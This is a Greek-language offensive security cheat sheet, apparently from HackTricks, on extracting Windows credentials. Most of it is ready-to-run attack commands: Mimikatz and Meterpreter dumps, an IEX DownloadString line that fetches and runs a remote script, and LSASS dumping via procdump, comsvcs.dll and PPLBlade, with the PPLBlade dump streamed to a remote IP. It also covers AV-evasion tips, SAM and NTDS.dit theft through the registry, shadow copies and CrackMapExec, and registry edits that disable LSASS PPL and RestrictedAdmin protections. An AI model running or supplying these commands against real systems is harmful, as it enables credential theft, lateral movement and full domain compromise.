# Υποκλοπή Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz στη** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για μερικές πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες μπορούν να αποτρέψουν το Mimikatz από την εξαγωγή ορισμένων διαπιστευτηρίων.**

## Διαπιστευτήρια με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) που δημιούργησα για να αναζητήσετε κωδικούς πρόσβασης και hashes μέσα στο θύμα.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Παράκαμψη AV

### Procdump + Mimikatz

Επειδή το **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν εντοπίζεται από τον Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **dump the lsass process**, **download the dump** και να **εξαγάγετε** τα **credentials τοπικά** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Αυτή η διαδικασία γίνεται αυτόματα με [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Κάποια **AV** μπορεί να **εντοπίσουν** ως **κακόβουλη** τη χρήση του **procdump.exe to dump lsass.exe**, αυτό συμβαίνει επειδή **εντοπίζουν** τη συμβολοσειρά **"procdump.exe" and "lsass.exe"**. Επομένως είναι πιο **stealthier** να **περάσετε** ως **argument** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Dumping του lsass με **comsvcs.dll**

Μια DLL με όνομα **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνη για το **dumping process memory** σε περίπτωση crash. Αυτή η DLL περιέχει μια **συνάρτηση** με όνομα **`MiniDumpW`**, που έχει σχεδιαστεί να κληθεί χρησιμοποιώντας `rundll32.exe`.\
Δεν έχει σημασία τι δίνονται ως οι πρώτες δύο παράμετροι, αλλά η τρίτη χωρίζεται σε τρία στοιχεία. Το process ID που θα γίνει dump αποτελεί το πρώτο στοιχείο, η τοποθεσία του dump file αντιπροσωπεύει το δεύτερο, και το τρίτο στοιχείο είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Μετά την ανάλυση αυτών των τριών στοιχείων, η DLL δημιουργεί το dump file και μεταφέρει τη μνήμη της συγκεκριμένης διεργασίας σε αυτό το αρχείο.\
Η χρήση της **comsvcs.dll** είναι εφικτή για το dumping της διεργασίας lsass, εξαλείφοντας έτσι την ανάγκη να ανεβάσετε και να εκτελέσετε το procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Δημιουργία dump του lsass με Task Manager**

1. Κάντε δεξί κλικ στο Task Bar και επιλέξτε Task Manager
2. Κάντε κλικ στο More details
3. Αναζητήστε τη διαδικασία "Local Security Authority Process" στην καρτέλα Processes
4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Create dump file".

### Δημιουργία dump του lsass με procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα ψηφιακά υπογεγραμμένο εκτελέσιμο της Microsoft που αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα Protected Process Dumper Tool που υποστηρίζει το obfuscating των memory dump και τη μεταφορά τους σε απομακρυσμένους σταθμούς εργασίας χωρίς να τα γράφει στο δίσκο.

**Κύριες λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Αποκρύπτοντας αρχεία memory dump για την αποφυγή μηχανισμών ανίχνευσης βάσει signatures του Defender
3. Μεταφόρτωση memory dump με μεθόδους RAW και SMB χωρίς να τα γράφει στο δίσκο (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon ships a three-stage dumper dubbed **LalsDumper** that never calls `MiniDumpWriteDump`, so EDR hooks on that API never fire:

1. **Stage 1 loader (`lals.exe`)** – searches `fdp.dll` for a placeholder consisting of 32 lower-case `d` characters, overwrites it with the absolute path to `rtu.txt`, saves the patched DLL as `nfdp.dll`, and calls `AddSecurityPackageA("nfdp","fdp")`. This forces **LSASS** to load the malicious DLL as a new Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – when LSASS loads `nfdp.dll`, the DLL reads `rtu.txt`, XORs each byte with `0x20`, and maps the decoded blob into memory before transferring execution.
3. **Stage 3 dumper** – the mapped payload re-implements MiniDump logic using **direct syscalls** resolved from hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). A dedicated export named `Tom` opens `%TEMP%\<pid>.ddt`, streams a compressed LSASS dump into the file, and closes the handle so exfiltration can happen later.

Σημειώσεις χειριστή:

* Διατήρησε `lals.exe`, `fdp.dll`, `nfdp.dll`, και `rtu.txt` στον ίδιο φάκελο. Το Stage 1 ξαναγράφει το hard-coded placeholder με την απόλυτη διαδρομή προς το `rtu.txt`, οπότε ο διαχωρισμός τους σπάει την αλυσίδα.
* Η εγγραφή γίνεται με την προσθήκη του `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείς να ορίσεις αυτή την τιμή ο ίδιος για να κάνεις το LSASS να φορτώνει ξανά το SSP σε κάθε εκκίνηση.
* Τα αρχεία `%TEMP%\*.ddt` είναι συμπιεσμένα dumps. Αποσυμπιέστε τα τοπικά, και μετά δώστε τα σε Mimikatz/Volatility για εξαγωγή διαπιστευτηρίων.
* Η εκτέλεση του `lals.exe` απαιτεί δικαιώματα admin/SeTcb ώστε το `AddSecurityPackageA` να επιτύχει· μόλις η κλήση επιστρέψει, το LSASS φορτώνει διαφανώς το κακόβουλο SSP και εκτελεί το Stage 2.
* Η αφαίρεση του DLL από το δίσκο δεν το απομακρύνει από το LSASS. Είτε διαγράψτε την καταχώρηση στο registry και επανεκκινήστε το LSASS (reboot) είτε αφήστε το για μακροχρόνια persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump του NTDS.dit από τον στόχο DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump του NTDS.dit password history από τον target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνιση της ιδιότητας pwdLastSet για κάθε λογαριασμό NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Αυτά τα αρχεία θα πρέπει να βρίσκονται στο _C:\windows\system32\config\SAM_ και στο _C:\windows\system32\config\SYSTEM_. Αλλά **δεν μπορείτε απλά να τα αντιγράψετε με τον κανονικό τρόπο** γιατί είναι προστατευμένα.

### Από το Μητρώο

Ο ευκολότερος τρόπος για να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το μητρώο:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στο Kali μηχάνημά σας και **εξαγάγετε τα hashes** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Πρέπει να είστε Διαχειριστής.

#### Χρήση vssadmin

Το εκτελέσιμο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείτε να κάνετε το ίδιο από **Powershell**. Αυτό είναι ένα παράδειγμα για το **πώς να αντιγράψετε το αρχείο SAM** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να το χρησιμοποιήσετε για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να αντιγράψετε τα SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Το **NTDS.dit** αρχείο είναι γνωστό ως η καρδιά του **Active Directory**, περιέχοντας κρίσιμα δεδομένα για αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εκεί αποθηκεύονται τα **password hashes** για τους domain users. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στο **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτή τη βάση δεδομένων διατηρούνται τρία κύρια tables:

- **Data Table**: Αυτό το table αναλαμβάνει την αποθήκευση λεπτομερειών για αντικείμενα όπως users και groups.
- **Link Table**: Καταγράφει σχέσεις, όπως οι memberships σε groups.
- **SD Table**: Εδώ κρατιούνται οι **Security descriptors** για κάθε αντικείμενο, εξασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης των αποθηκευμένων αντικειμένων.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Τα Windows χρησιμοποιούν _Ntdsa.dll_ για να αλληλεπιδράσουν με αυτό το αρχείο και αυτό χρησιμοποιείται από _lsass.exe_. Έτσι, **μέρος** του **NTDS.dit** αρχείου μπορεί να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορεί να βρείτε τα πιο πρόσφατα προσπελάσιμα δεδομένα πιθανώς λόγω βελτίωσης της απόδοσης με χρήση **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash κρυπτογραφείται 3 φορές:

1. **Αποκρυπτογραφήστε** το Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και **RC4**.
2. **Αποκρυπτογραφήστε** το **hash** χρησιμοποιώντας το **PEK** και **RC4**.
3. **Αποκρυπτογραφήστε** το **hash** χρησιμοποιώντας **DES**.

Το **PEK** έχει την **ίδια τιμή** σε κάθε **domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του αρχείου **SYSTEM** του domain controller (είναι διαφορετικό μεταξύ domain controllers). Γι' αυτό, για να πάρετε τα credentials από το αρχείο NTDS.dit **χρειάζεστε** τα αρχεία NTDS.dit και SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Αντιγραφή του NTDS.dit με Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Μπορείτε επίσης να χρησιμοποιήσετε το κόλπο [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του **SYSTEM file** (ξανά, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) κόλπο).

### **Εξαγωγή hashes από το NTDS.dit**

Μόλις έχετε **αποκτήσει** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως _secretsdump.py_ για να **εξαγάγετε τα hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να **τα εξάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για **μεγάλα αρχεία NTDS.dit** συνιστάται να τα εξάγετε χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων domain από NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε μια βάση δεδομένων SQLite με [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Όχι μόνο τα μυστικά εξάγονται αλλά και ολόκληρα τα αντικείμενα και τα attributes τους για περαιτέρω εξαγωγή πληροφοριών όταν το ακατέργαστο αρχείο NTDS.dit έχει ήδη ανακτηθεί.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Το `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, supplemental credentials όπως cleartext passwords, kerberos ή trust keys, NT & LM password histories). Μαζί με άλλες πληροφορίες, εξάγονται τα εξής δεδομένα: user and machine accounts με τα hashes τους, UAC flags, timestamp για last logon και password change, accounts description, names, UPN, SPN, groups και recursive memberships, organizational units tree και membership, trusted domains με trusts type, direction και attributes...

## Lazagne

Κατεβάστε το binary από [here](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξάγετε credentials από διάφορα software.
```
lazagne.exe all
```
## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από το SAM και το LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Κατεβάστε το από: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλά **εκτελέστε το** και οι κωδικοί θα εξαχθούν.

## Εξόρυξη ανενεργών συνεδριών RDP και αποδυνάμωση των μέτρων ασφαλείας

Το FinalDraft RAT του Ink Dragon περιλαμβάνει έναν `DumpRDPHistory` tasker των οποίων οι τεχνικές είναι χρήσιμες για κάθε red-teamer:

### Συλλογή τηλεμετρικών δεδομένων τύπου DumpRDPHistory

* **Εξερχόμενοι στόχοι RDP** – αναλύστε κάθε user hive στο `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε υποκλειδί αποθηκεύει το όνομα του server, το `UsernameHint`, και το timestamp της τελευταίας εγγραφής. Μπορείτε να αναπαράγετε τη λογική του FinalDraft με PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Εισερχόμενες αποδείξεις RDP** – ελέγξτε το log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` για Event IDs **21** (successful logon) και **25** (disconnect) για να χαρτογραφήσετε ποιος διαχειριζόταν το μηχάνημα:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Μόλις γνωρίζετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) ενώ η **αποσυνδεδεμένη** συνεδρία του εξακολουθεί να υπάρχει. Το CredSSP + NTLM fallback αφήνει τον verifier και τα tokens τους στο LSASS, τα οποία μπορούν στη συνέχεια να αναπαραχθούν μέσω SMB/WinRM για να αποκτήσετε το `NTDS.dit` ή να ετοιμάσετε persistence σε domain controllers.

### Υποβαθμίσεις μητρώου που στοχεύει το FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Η ρύθμιση `DisableRestrictedAdmin=1` αναγκάζει full credential/ticket reuse κατά το RDP, επιτρέποντας pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το UAC token filtering, ώστε οι local admins να λαμβάνουν unrestricted tokens μέσω του δικτύου.
* `DSRMAdminLogonBehavior=2` επιτρέπει στον DSRM administrator να κάνει log on ενώ ο DC είναι online, δίνοντας στους attackers έναν ακόμη ενσωματωμένο high-privilege account.
* `RunAsPPL=0` αφαιρεί τις LSASS PPL protections, κάνοντας την πρόσβαση στη μνήμη απλή για dumpers όπως LalsDumper.

## Αναφορές

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
